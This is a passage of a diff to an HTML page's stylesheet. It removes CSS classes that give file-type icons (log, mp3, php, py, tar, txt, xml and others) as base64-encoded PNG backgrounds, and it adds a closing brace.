-		.lnk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXFmzzYmnRNLuigJZAUAAgCI71YEPgJXrsCKAAAAAXRSTlMAQObYZgAAAGRJREFUeF4lzLEKgDAMRdEMFedQ7W6LOItgZ8HuRQjuKv5B/9+8mulwE0K0YxIReR9mThlYuBMAQbBa2CKQBh4rmPVGMVh2V0Xc3hsI5fgxyekeoEi79oBk4wrQkIl4qDQ1oCF8s2QTzGgZmRgAAAAASUVORK5CYII=") no-repeat;}
-		.log{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHAwMAAAAD///+AgIAAALWAgAD//wD7+LBgAAAAAXRSTlMAQObYZgAAAFxJREFUeF41jMsJgEAMRIcFC/DiOYxsAf5yly1BbECELcD+wWSN7/SYgQeIAyCtxmxSRkc6lMWY5AzJB/beyVssjEuZv6tebIs+tzSpSvg1kAJfaEH8ZUTQJNEBXtl7FF5T+NYtAAAAAElFTkSuQmCC") no-repeat;}
-		.mp3{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMCAgIAAAACAgAD//wAFULzlAAAAAXRSTlMAQObYZgAAAGdJREFUeAE1ykEKAjEUA9AgzgFC5wKjg2tj1X2hPcAH7Qm8/xlMi2aTR/4HkJ2rGyJ5/mMb0yOTtQJLtCB34J2KkrHEZ5OMuKxuoz/Xoqwdx+bTfL73Ig0c2iuS4amSE+IPt5MzUGe+vOoRl1gyM5QAAAAASUVORK5CYII=") no-repeat;}
-		.php{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEXt7u20pbN1PXqqna3h3+CiY5iji5/Cn72aaulJAAAAB3RSTlP+C/jy9vd9m8nrNgAAAGNJREFUeF41zMEJwCAMheF36AK5dAChOIDiuZRMIATP0tIBKpL1m4r9L/kg8EAXM1ciEKz0I9SJliYWnoCdVUc3RLpIEUH2sRU9NjivUfVxhhx8d4YZ1jCqIN6/RTKMDGewEr0JfRdojfORagAAAABJRU5ErkJggg==") no-repeat;}
-		.pl{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVLS/WWlrdzc7O7u/L39/0vLzB1dXfIyLy8AAAAbUlEQVR4XkXLQQ4CIQyF4RfxAjWVteIFUAxryfQEmrKfCHP/I0jJJP6rL3l5oD2wSH6KFHC694+Bat+qwa+lKtvkt6xNHmDRs7ZSccHsgFuMA24ARwdnWF7JJQMQsWNO/xcvun69vkEUAp3C9QcQsBJpjnPQBwAAAABJRU5ErkJggg==") no-repeat;}
-		.py{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASBAMAAACgFUNZAAAAFVBMVEXU1dBJSUmIiIhMaXH39/ZJf6z12mal68qMAAAABHRSTlPwbJkA1LtzKgAAAGFJREFUeF49yrsNhEAMRdGHZBMjoAFowQ04sIg38cYTTf8l8MwIbnT8wXo+HdhFgjl2BwbCM6UgqvkruOaAJtGIZP/+AYW59wJHVs8vnJcGIq7CRDjhGxHOhRXIzbCATWY3y8IfVW0lgwUAAAAASUVORK5CYII=") no-repeat;}
-		.rename{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAHlBMVEXP2unl6/NogqS8x9Y/R1L5+/2GlKecqLgrMTpabYUCMXjvAAAACXRSTlP99gP+rv7d/ScbTgzOAAAAdElEQVR4AWNQUmY2NmZrUgIyBBgYRDOgDNYQKINBpAnKCAExBIEAxGiHSiUXGwOBeQlDomBooGhoYAhD4vTk9OLUMBGGxInlCQHTw1gYEmeWTisvL2MBShVODE7MZGFImFg8LT1RTASoS1CAEWgiQ4sLBAAAQBEfQdjw2gUAAAAASUVORK5CYII=") no-repeat;}
-		.swf{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAGFBMVEVMaXEAAAD/////RBylAAD8z5/njpP/tgDJs8ZAAAAAAXRSTlMAQObYZgAAAGpJREFUeAFjwAEYBcEAzFQCAUUoM1zJSCkAwlQPMgo2ADGBrFJTU4gC1fJ04wCoWrUiVWNjCDPFSdkYIqriFuIC1aYSlJLsZAxV66LmxgxiKgqpuCmZQNQKhiQpqYCZimIgR6A4B+FIHAAAPKISiDRgUyIAAAAASUVORK5CYII=") no-repeat;}
-		.tar{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXE7QAUXAAAAUW/l6ey8lKGJBVFVz9lgkT8gAAAAAXRSTlMAQObYZgAAAFJJREFUeAFjEIQAAYbQ0MQ0IEhicHFJcQkNDQ0CMlJhIoJKIMCgBAEKQMXGYACUMnEvLy8vBjJMYSKCYAayYogdQCkRkOJCIEMUpMQQpBgM4IoBaBkbvmcdFLkAAAAASUVORK5CYII=") no-repeat;}
-		.txt{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAD1BMVEVMaXH///8AAADHx8eFhYXIFtsVAAAAAXRSTlMAQObYZgAAADVJREFUeAFjYGACAwYQUHQEAQUgi0UIAkBMQTAwQmcqKSopYRFVolQUwTQGAxCTQQkMgC4DAOb7DCz7id5MAAAAAElFTkSuQmCC") no-repeat;}
-		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
-		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
-
+		}
 	  </style>
 	</head>
 	<body>
